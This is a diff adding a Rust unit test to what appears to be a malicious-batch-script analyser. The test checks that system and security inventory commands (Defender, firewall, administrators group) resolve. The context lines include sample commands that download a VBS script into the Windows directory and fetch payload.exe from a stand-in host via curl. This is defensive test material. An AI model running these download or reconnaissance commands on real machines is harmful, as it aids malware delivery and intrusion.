@@ -5588,6 +5588,48 @@ wget --no-check-certificate %urlgit%/win/get.vbs -O %windir%\get.vbs
     }
 
     #[test]
+    fn for_f_reads_common_security_inventory_output() {
+        let script = concat!(
+            "for /f \"tokens=*\" %%v in ('vol %SystemDrive% 2^>nul') do echo vol=%%v\r\n",
+            "for /f \"tokens=*\" %%t in ('tzutil /g 2^>nul') do echo tz=%%t\r\n",
+            "for /f \"tokens=*\" %%s in ('sc query WinDefend 2^>nul') do echo svc=%%s\r\n",
+            "for /f \"tokens=*\" %%f in ('netsh advfirewall show allprofiles state 2^>nul') do echo fw=%%f\r\n",
+            "for /f \"tokens=*\" %%k in ('schtasks /query /tn \"Updater\" 2^>nul') do echo task=%%k\r\n",
+            "for /f \"tokens=*\" %%e in ('wevtutil qe System /c:1 /f:text 2^>nul') do echo evt=%%e\r\n",
+            "for /f \"tokens=*\" %%g in ('net localgroup administrators 2^>nul') do echo group=%%g\r\n",
+        );
+        let report = analyze(script.as_bytes(), &Config::default());
+        assert!(
+            report.deobfuscated.contains("echo vol= Volume in drive")
+                && report
+                    .deobfuscated
+                    .contains("echo tz=Central Standard Time")
+                && report
+                    .deobfuscated
+                    .contains("echo svc=SERVICE_NAME: WinDefend")
+                && report.deobfuscated.contains("echo fw=State")
+                && report
+                    .deobfuscated
+                    .contains(r#"echo task=TaskName: \Updater"#)
+                && report.deobfuscated.contains("echo evt=Event[0]:")
+                && report
+                    .deobfuscated
+                    .contains("echo group=Alias name administrators"),
+            "deobf:\n{}\ntraits: {:?}",
+            report.deobfuscated,
+            report.traits
+        );
+        assert!(
+            !report
+                .traits
+                .iter()
+                .any(|t| matches!(t, Trait::ForUnresolvedSource { .. })),
+            "security inventory commands should resolve: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn compact_for_f_reads_generated_file_source() {
         let script = br#"echo https://compact-for-f.example/payload.exe>url.txt
 for/f "tokens=* delims=" %%U in (url.txt) do curl -o payload.exe %%U"#;
